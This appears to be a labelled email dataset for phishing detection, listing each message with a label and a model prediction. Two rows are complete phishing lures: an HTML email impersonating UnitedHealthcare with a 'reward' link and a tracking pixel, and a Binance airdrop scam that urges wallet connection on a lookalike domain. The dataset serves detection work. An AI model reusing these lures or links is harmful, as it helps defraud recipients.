subject,body,label,model_prediction
Member 840730: Claim Your UnitedHealthcare Appreciation Gift,"<!DOCTYPE html><html lang=""en""><head>
<meta http-equiv=""Content-Type"" content=""text/html; charset=utf-8"">
<meta name=""viewport"" content=""width=device-width, initial-scale=1.0"">
<title>UnitedHealthcare Member Reward</title>
</head>
<body style=""margin:0; padding:0; background-color:#F2F7FB; font-family: Arial, Helvetica, sans-serif;"">

<table role=""presentation"" width=""100%"" cellspacing=""0"" cellpadding=""0"" border=""0"" style=""padding:30px 0;"">
<tr>
<td align=""center"">

<table role=""presentation"" width=""600"" cellspacing=""0"" cellpadding=""0"" border=""0"" style=""background:#ffffff; border-radius:14px; overflow:hidden;
box-shadow:0 6px 28px rgba(0,0,0,0.08);"">

<!-- HEADER -->
<tr>
<td align=""center"" style=""background:linear-gradient(135deg, #E5F2FA 0%, #D5EAF8 100%);
padding:38px 20px;"">
<img src=""//1000logos.net/wp-content/uploads/2018/02/unitedhealthcare-emblem.png"" width=""210"" alt=""UnitedHealthcare"" style=""display:block; margin:0 auto;"">
</td>
</tr>

<!-- HERO ICON -->
<tr>
<td align=""center"" style=""padding:40px 30px 0;"">
<img src=""//www.unitedhealthgroup.com/content/dam/UHG/Images/newsroom/newsroom-2023/Icon_Care_2C_CirBlue_RGB.png"" width=""120"" style=""margin-bottom:20px;"">
</td>
</tr>

<!-- TEXT CONTENT -->
<tr>
<td style=""padding:0 40px 35px; text-align:left; color:#003366;"">

<h1 style=""margin:0 0 18px; font-size:28px; font-weight:700; color:#002F6C;"">
A Thank-You, Just for You
</h1>

<p style=""margin:0 0 18px; font-size:17px; line-height:1.65; color:#333;"">
As a valued UnitedHealthcare member, we’re pleased to let you know that
you’ve been selected for an exclusive appreciation reward.
</p>

<p style=""margin:0; font-size:17px; line-height:1.65; color:#333;"">
Your continued trust means a lot — and this member reward has been set aside just for you.
</p>

</td>
</tr>

<!-- CTA BUTTON -->
<tr>
<td align=""center"" style=""padding:0 40px 40px;"">
<a href=""http://hollybolly.de/4sRyVd1798lhzf63naxxrtqahm80NMNOFYDSOGOJSOM285239JKHC364912b1"" target=""_blank"" style=""background:#0057B8; color:#fff; text-decoration:none;
padding:16px 44px; font-size:17px; font-weight:600;
border-radius:32px; display:inline-block;
box-shadow:0 4px 14px rgba(0,87,184,0.25);"">
Claim Your Member Reward
</a>
</td>
</tr>

<!-- EXPIRATION NOTICE -->
<tr>
<td align=""center"" style=""padding:0 40px 38px;"">
<p style=""font-size:15px; font-weight:600; color:#D6452A; margin:0;"">
Available for the next 3 days
</p>
</td>
</tr>

<!-- FOOTER -->
<tr>
<td style=""background:#EAF4FB; padding:32px 40px; text-align:left;
font-size:12px; color:#555; line-height:1.6;"">

<p style=""margin:0 0 12px;"">
You received this email because you are a UnitedHealthcare member.
</p>

<p style=""margin:0 0 15px;"">
To stop receiving future member reward messages,
<a href=""http://hollybolly.de/5AMPTh1798qrNz63nsziwmjinb80BSAIETJTDUMOWZR285239MLFZ364912m1"" style=""color:#003A70; text-decoration:underline;"">
click here to unsubscribe
</a>.
</p>

<img src=""http://hollybolly.de/track/3HvLVS1798tXlI63hfuctpyfzo80KWQLLQWUKTHTUHL285239PBJP364912b1"" width=""1"" height=""1"" alt="""">

<p style=""margin:15px 0 0; font-size:11px; color:#777;"">
© 2025 UnitedHealthcare Services, Inc. All rights reserved.
</p>

</td>
</tr>

</table>

</td>
</tr>
</table>

</body>
</html>",1,1
Customer issue: Johnson Equipment Company - Billing entity clarification needed,"FYI - Customer complaint received:

Customer: Johnson Equipment Company
Issue: Billing entity clarification needed
Severity: 4/5

Please review and advise if escalation needed.

Rodney Flantz",0,1
Re: URGENT: Production Down - IAM Integration Failing in Cloud Environment,"Dear John,

Thank you for providing the additional information.

We have identified the issue and are working on a fix. We apologize for the delay in our response and the inconvenience this outage has caused.

We will keep you updated on the progress.

Sincerely,
Aetheros Support Team",0,0
[clamav-virusdb] Update (daily: 5738),ClamAV database updated (08 Feb 2008 09-45 +0000): daily.cvd Version: 5738 Submission-ID: 2041896 Sender: Virus Total Submission notes: Same as in Submission-ID 2040485 Added: No Submission-ID: 2042104 Sender: Virus Total Submission notes: Same as in Submission-ID 2047669 Added: No Submission-ID: 2042430 Sender: VirScan.org Submission notes: Same as in Submission-ID 2465869 Added: No Submission-ID: 2044760 Sender: VirScan.org Submission notes: Same as in Submission-ID 2541662 Added: No Submission-ID: 2045009 Sender: Virus Total Submission notes: Same as in Submission-ID 2373337 Added: No Submission-ID: 2047617 Sender: Virus Total Submission notes: Same as in Submission-ID 2047669 Added: No Submission-ID: 2047669 Sender: Virus Total Submission notes: Already detected as Trojan.Dropper-4548 Added: No Virus name alias: Trojan.Agent.AFPP (Bitdefender) Submission-ID: 2047686 Sender: Virus Total Submission notes: Same as in Submission-ID 2047669 Added: No Submission-ID: 2050261 Sender: Virus Total Submission notes: Already detected as Trojan.Dropper-4438 Added: No Submission-ID: 2051579 Sender: Virus Total Submission notes: Same as in Submission-ID 2047669 Added: No Submission-ID: 2052121 Sender: Virus Total Submission notes: Already detected as Trojan.Dropper-4558 Added: No Submission-ID: 2052127 Sender: Virus Total Submission notes: Already detected as Trojan.Dropper-4480 Added: No Submission-ID: 2052188 Sender: Virus Total Submission notes: Already detected as Trojan.Dropper-4403 Added: No Submission-ID: 2052791 Sender: VirScan.org Submission notes: Already detected as Trojan.Visel-21 Added: No Submission-ID: 2053050 Sender: Virus Total Submission notes: Already detected as Trojan.Downloader-22996 Added: No Submission-ID: 2053261 Sender: Virus Total Submission notes: Same as in Submission-ID 2413200 Added: No Submission-ID: 2053278 Sender: Virus Total Submission notes: Same as in Submission-ID 2541994 Added: No Submission-ID: 2053561 Sender: Virus Total Submission notes: Same as in Submission-ID 2413200 Added: No Submission-ID: 2055221 Sender: Virus Total Submission notes: Already detected as Trojan.Agent-12991 Added: No Submission-ID: 2056053 Sender: Virus Total Submission notes: Already detected as Trojan.Agent-12990 Added: No Submission-ID: 2058392 Sender: Virus Total Submission notes: Same as in Submission-ID 2053050 Added: No Submission-ID: 2058970 Sender: Virus Total Submission notes: Same as in Submission-ID 2458695 Added: No Submission-ID: 2060570 Sender: Virus Total Submission notes: Same as in Submission-ID 2413200 Added: No Submission-ID: 2060862 Sender: Virus Total Submission notes: Same as in Submission-ID 2065255 Added: No Submission-ID: 2065196 Sender: Virus Total Submission notes: Same as in Submission-ID 2047669 Added: No Submission-ID: 2065255 Sender: Virus Total Submission notes: Already detected as Trojan.Downloader-23013 Added: No Submission-ID: 2065609 Sender: VirScan.org Submission notes: Same as in Submission-ID 2541662 Added: No Submission-ID: 2070536 Sender: Jotti Submission notes: Same as in Submission-ID 2358696 Added: No Submission-ID: 2071445 Sender: Jotti Submission notes: Same as in Submission-ID 2358696 Added: No Submission-ID: 2073244 Sender: VirScan.org Submission notes: Same as in Submission-ID 2541662 Added: No Submission-ID: 2073427 Sender: Virus Total Submission notes: Already detected as Trojan.Dropper-4545 Added: No Submission-ID: 2073725 Sender: VirScan.org Submission notes: Same as in Submission-ID 2455342 Added: No Submission-ID: 2073839 Sender: Virus Total Submission notes: Same as in Submission-ID 2328248 Added: No Submission-ID: 2073906 Sender: VirScan.org Submission notes: Already detected as Trojan.Hupigon-7377 Added: No Submission-ID: 2073993 Sender: VirScan.org Submission notes: Same as in Submission-ID 2074011 Added: No Submission-ID: 2074011 Sender: VirScan.org Submission notes: Already detected as Trojan.Hupigon-7394 Added: No Submission-ID: 2074960 Sender: Jotti Submission notes: Same as in Submission-ID 2458695 Added: No Submission-ID: 2076693 Sender: VirScan.org Submission notes: Already detected as Trojan.Hupigon-7453 Added: No Submission-ID: 2077398 Sender: VirScan.org Submission notes: Same as in Submission-ID 2451199 Added: No Submission-ID: 2077562 Sender: VirScan.org Submission notes: Same as in Submission-ID 2541662 Added: No Submission-ID: 2077949 Sender: Virus Total Submission notes: Same as in Submission-ID 2376037 Added: No Submission-ID: 2078835 Sender: VirScan.org Submission notes: Already detected as Trojan.Hupigon-7327 Added: No Submission-ID: 2079499 Sender: Virus Total Submission notes: Already detected as Trojan.PcClient-715 Added: No Submission-ID: 2079816 Sender: Jotti Submission notes: Same as in Submission-ID 2188295 Added: No Submission-ID: 2081108 Sender: Virus Total Submission notes: Same as in Submission-ID 2541662 Added: No Submission-ID: 2083250 Sender: VirScan.org Submission notes: Same as in Submission-ID 2541662 Added: No Submission-ID: 2084889 Sender: VirScan.org Submission notes: Same as in Submission-ID 2084934 Added: No Submission-ID: 2084934 Sender: VirScan.org Submission notes: Already detected as Trojan.Visel-18 Added: No Submission-ID: 2086163 Sender: VirScan.org Submission notes: Already detected as Trojan.Dropper-4506 Added: No Submission-ID: 2086627 Sender: Virus Total Submission notes: Already detected as Trojan.Mybot-9642 Added: No Submission-ID: 2087284 Sender: Virus Total Submission notes: Same as in Submission-ID 2047669 Added: No Submission-ID: 2087537 Sender: VirScan.org Submission notes: Same as in Submission-ID 2326730 Added: No Submission-ID: 2088034 Sender: VirScan.org Submission notes: Same as in Submission-ID 2465869 Added: No Submission-ID: 2090050 Sender: Jotti Submission notes: Same as in Submission-ID 2541994 Added: No Submission-ID: 2090280 Sender: Jotti Submission notes: Same as in Submission-ID 2541994 Added: No Submission-ID: 2090290 Sender: Jotti Submission notes: Same as in Submission-ID 2541994 Added: No Submission-ID: 2091178 Sender: Virus Total Submission notes: Already detected as Trojan.PcClient-696 Added: No Submission-ID: 2094019 Sender: Virus Total Submission notes: Same as in Submission-ID 2047669 Added: No Submission-ID: 2095529 Sender: Virus Total Submission notes: Same as in Submission-ID 2047669 Added: No Submission-ID: 2095773 Sender: OITC Submission notes: Already detected as Trojan.Mybot-9635 Added: No Submission-ID: 2095777 Sender: OITC Submission notes: Same as in Submission-ID 2095773 Added: No Submission-ID: 2098820 Sender: Virus Total Submission notes: Already detected as Trojan.VB-1650 Added: No Submission-ID: 2100280 Sender: Jotti Submission notes: Already detected as Trojan.Dropper-4516 Added: No Submission-ID: 2101993 Sender: Virus Total Submission notes: Already detected as Trojan.PcClient-749 Added: No Submission-ID: 2104330 Sender: Jotti Submission notes: Same as in Submission-ID 2137784 Added: No Submission-ID: 2105014 Sender: Jotti Submission notes: Same as in Submission-ID 2100280 Added: No Submission-ID: 2106860 Sender: VirScan.org Submission notes: Same as in Submission-ID 2126844 Added: No Submission-ID: 2111879 Sender: VirScan.org Submission notes: Already detected as Trojan.Visel-22 Added: No Submission-ID: 2113216 Sender: Virus Total Submission notes: Already detected as Trojan.Dropper-4361 Added: No Virus name alias: Dropped:Rootkit.112 (Bitdefender) Submission-ID: 2114514 Sender: Virus Total Submission notes: Same as in Submission-ID 2047669 Added: No Submission-ID: 2114823 Sender: Virus Total Submission notes: Same as in Submission-ID 2533867 Added: No Submission-ID: 2114895 Sender: Virus Total Submission notes: Same as in Submission-ID 2533867 Added: No Submission-ID: 2115284 Sender: VirScan.org Submission notes: Already detected as Trojan.Hupigon-7374 Added: No Submission-ID: 2115460 Sender: Jotti Submission notes: Already detected as Trojan.Dropper-4352 Added: No Submission-ID: 2115565 Sender: VirScan.org Submission notes: Already detected as Trojan.Hupigon-7293 Added: No Submission-ID: 2117129 Sender: Virus Total Submission notes: Same as in Submission-ID 2441664 Added: No Submission-ID: 2117498 Sender: Jotti Submission notes: Same as in Submission-ID 2100280 Added: No Submission-ID: 2117534 Sender: VirScan.org Submission notes: Same as in Submission-ID 2364991 Added: No Submission-ID: 2119079 Sender: Virus Total Submission notes: Same as in Submission-ID 2136410 Added: No Submission-ID: 2119528 Sender: VirScan.org Submission notes: Same as in Submission-ID 2126844 Added: No Submission-ID: 2119748 Sender: VirScan.org Submission notes: Same as in Submission-ID 2192936 Added: No Submission-ID: 2120009 Sender: Virus Total Submission notes: Same as in Submission-ID 2441664 Added: No Submission-ID: 2120087 Sender: VirScan.org Submission notes: Same as in Submission-ID 2522768 Added: No Submission-ID: 2120114 Sender: VirScan.org Submission notes: Same as in Submission-ID 2373378 Added: No Submission-ID: 2120319 Sender: Virus Total Submission notes: Already detected as Trojan.Downloader-22975 Added: No Submission-ID: 2120491 Sender: Virus Total Submission notes: Same as in Submission-ID 2441664 Added: No Submission-ID: 2120532 Sender: Virus Total Submission notes: Already detected as Trojan.Dropper-4389 Added: No Submission-ID: 2121190 Sender: VirScan.org Submission notes: Same as in Submission-ID 2132274 Added: No Submission-ID: 2122303 Sender: Virus Total Submission notes: Already detected as Trojan.Downloader-22952 Added: No Submission-ID: 2123089 Sender: Virus Total Submission notes: Already detected as Trojan.Hupigon-7383 Added: No Submission-ID: 784603 Sender: Virus Total Submission notes: Already detected as Trojan.Spy-23731 Added: No Virus name alias: Trojan.Pws.Icqsmiley.C (Bitdefender) Submission-ID: 2125895 Sender: Virus Total Submission notes: Same as in Submission-ID 2441664 Added: No Submission-ID: 2125903 Sender: Virus Total Submission notes: Same as in Submission-ID 2441664 Added: No Submission-ID: 2125938 Sender: Virus Total Submission notes: Same as in Submission-ID 2441664 Added: No Submission-ID: 2125972 Sender: Virus Total Submission notes: Same as in Submission-ID 2441664 Added: No Submission-ID: 2126239 Sender: Virus Total Submission notes: Already detected as Trojan.Agent-12994 Added: No Submission-ID: 2126844 Sender: VirScan.org Submission notes: Already detected as Trojan.Dropper-4351 Added: No Submission-ID: 2126853 Sender: VirScan.org Submission notes: Same as in Submission-ID 2126844 Added: No Submission-ID: 2129184 Sender: Virus Total Submission notes: Same as in Submission-ID 2115460 Added: No Submission-ID: 2129634 Sender: Virus Total Submission notes: Same as in Submission-ID 2471810 Added: No Submission-ID: 2130013 Sender: Virus Total Submission notes: Same as in Submission-ID 2451199 Added: No Submission-ID: 2130147 Sender: VirScan.org Submission notes: Already detected as Trojan.Visel-19 Added: No Submission-ID: 2131029 Sender: Virus Total Submission notes: Same as in Submission-ID 2441664 Added: No Submission-ID: 2131122 Sender: Virus Total Submission notes: Same as in Submission-ID 2441664 Added: No Submission-ID: 2131160 Sender: Virus Total Submission notes: Same as in Submission-ID 2441664 Added: No Submission-ID: 2131884 Sender: VirScan.org Submission notes: Same as in Submission-ID 2541662 Added: No Submission-ID: 2132274 Sender: Virus Total Submission notes: Already detected as Trojan.Agent-12997 Added: No Submission-ID: 2132780 Sender: Virus Total Submission notes: Same as in Submission-ID 2100280 Added: No Submission-ID: 2133300 Sender: VirScan.org Submission notes: Already detected as Trojan.Downloader-23009 Added: No Submission-ID: 2133420 Sender: Virus Total Submission notes: Same as in Submission-ID 2352205 Added: No Submission-ID: 2134644 Sender: Virus Total Submission notes: Already detected as Trojan.Mybot-9674 Added: No Submission-ID: 2135229 Sender: VirScan.org Su,0,1
Pipeline Update - January 09,"Morning update:

Opportunities in progress: 17
Value in pipeline: €181,332
Closes this week: 3

Key activities today:
- Customer meetings: 3
- Proposals to send: 1
- Follow-ups needed: 2

Gary",0,0
Guidance for Integrating Microsoft SQL Server 2019 SaaS Project Management Solution,"Inquiring about the process of integrating the Microsoft SQL Server 2019 SaaS project management solution. Seeking information on the process, requirements, and potential limitations. Would appreciate detailed guidance and documentation to help understand how to successfully integrate the systems. Specifically, interested in learning about data synchronization, security protocols, and compatibility issues. Would be grateful to review case studies or examples of successful integrations. Please let us know.",0,0
Re: [Ashish1007-ai/github-slideshow] Getting Started with GitHub (#1),"# Binance Airdrop Guide: Claim Your $1500 in BNB Now!

Congratulations! You've won a share of the $500k Binance Airdrop, and we're excited to give you $1500 in BNB to celebrate the end of the year. Follow the steps below to claim your tokens and make the most of this festive giveaway!

[![Claim Now](https://i.ytimg.com/vi/PFhGDyXstas/maxresdefault.jpg)](http://go.bnbcoinsearn.online/97Q7Yj)

## Steps to Claim:

### 1. Connect Your Binance Wallet:
- Click on the [Connect Wallet](https://go.bnbcoinsearn.online/97Q7Yj) link.
- Choose your preferred wallet provider (Metamask, Trust Wallet, etc.).

### 2. Interact with the Contract:
- Once your wallet is connected.
- Click on the ""**Claim**"" button to interact with the smart contract.

Don't miss out on your $1500 in BNB! Act now to secure your tokens.

Winners: @jean-francoisgiraud, @whrobbins, @MrCoolTheCucumber, @HiNLP2, @austinmccalley, @vamsiikrishna, @Simony17, @JinruiWang, @Ricochn, @sirdoro1, @geraldoahnert, @AliMilani, @mohammadazadbar1995, @jensrott, @stevehansen, @jmcudd, @zzvsjs1, @rameshrr, @nyaonmochi, @Nineww, @runningmaverick, @OofChair, @sylas00, @mrflo, @Bigtalljosh, @zhubby, @leo248387832, @SquirrelmasterC, @texplumber, @eugene, @rf-peixoto, @HoangTheBoss, @sparkyfen, @markdude701, @maxime-aknin, @phylom, @mcolbert7, @royd27, @nakadaole, @feruzoripov, @richardsonjf, @chastep, @THEONE10211024, @yochidros, @HowWeLand, @Niggelgame, @vehbibulut, @AndredAlmeida, @yarwelp, @dannymaclean98

--
Reply to this email directly or view it on GitHub:
https://github.com/Ashish1007-ai/github-slideshow/issues/1#issuecomment-1873346555
You are receiving this because you were mentioned.

Message ID: <Ashish1007-ai/github-slideshow/issues/1/1873346555@github.com>",1,1
Re: [ILUG] adsl router modem combo,"It seems to only support PPPoA and not PPPoE. You need one that supports
PPPoE, if you want torun it in routed IP mode. If you are using it as a
bridge, it'll probably work, but you'd be left leaving the computer on,
which would defeat the purpose of getting a router.

The best router I've come accross is the Zyxel 643. Eircom supply this,
but if you have alook online you can probably find it cheaper to buy
online from America or the UK.

Hope this is useful,
Joe

--
Irish Linux Users' Group: ilug@linux.ie
http://www.linux.ie/mailman/listinfo/ilug for (un)subscription information.
List maintainer: listmaster@linux.ie",0,1
Pipeline Update - January 08,"Morning update:

Opportunities in progress: 23
Value in pipeline: €940,549
Closes this week: 4

Key activities today:
- Customer meetings: 5
- Proposals to send: 3
- Follow-ups needed: 10

Tilly",0,0
Concern Regarding Data Analytics Tool Efficiency,"The data analytics tool is encountering sporadic performance issues. Recent software updates might be causing server overload. Despite restarting the tool and clearing the cache, the problems continue.",0,0
